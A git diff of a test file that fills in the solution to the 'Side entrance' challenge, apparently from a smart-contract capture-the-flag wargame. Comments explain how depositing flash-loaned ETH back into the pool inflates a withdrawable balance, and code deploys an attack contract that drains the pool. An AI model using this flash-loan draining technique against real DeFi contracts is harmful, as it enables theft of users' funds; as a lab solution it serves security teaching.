@@ -14,6 +14,8 @@ describe('[Challenge] Side entrance', function () {
         const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
         this.pool = await SideEntranceLenderPoolFactory.deploy();
         
+        
+        
         await this.pool.deposit({ value: ETHER_IN_POOL });
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
@@ -24,7 +26,38 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+      /**
+         * @dev
+         * The contract has a custom balances mapping to determine how much ETH an address can withdraw.
+         * The first flaw is that nothing stops ups from calling the deposit() function during a flashLoan, hence artificially increasing our ETH allowance.
+         * The second one is that the function call is done using a contract interface. We can implement any logic we want per standard Object Oriented inheritance, as long as it sticks to the same interface expected by SideEntranceLenderPool.
+         * We will create an attacking contract with an execute() function, which will call the pool's deposit() function to deposit ETH in the pool.
+         * Then, we create another function that will call the pool's flashLoan(). By calling a flash loan, borrowing the totality of the pool funds, we will trigger the execution of our execute() function that will deposit the ETH borrowed back to the pool. This will increase our balance in the Pool to be equal to the pool funds, which will allow us to drain the funds by calling withdraw().
+         * 
+         */
+      /** CODE YOUR EXPLOIT HERE */
+      const SideEntranceAttackFactory = await ethers.getContractFactory(
+        'SideEntranceAttack',
+        deployer
+      );
+      this.crooker = await SideEntranceAttackFactory.deploy(this.pool.address, ETHER_IN_POOL);
+
+      const balanceAttacker1 = await ethers.provider.getBalance(
+        attacker.address
+      );
+      console.log(`\u001b[1;33mThe attacker starts with ${Math.trunc(
+          ethers.utils.formatEther(balanceAttacker1)
+        )} ETH`);
+      console.log(`\u001b[1;35mStarting the attack`);
+      await this.crooker.attack();
+      await this.crooker.drain(attacker.address);
+
+      const balanceAttacker2 = await ethers.provider.getBalance(attacker.address);
+      console.log(
+        `\u001b[1;33mThe attacker now has got ${Math.trunc(
+          ethers.utils.formatEther(balanceAttacker2)
+        )} ETH`
+      );
     });
 
     after(async function () {
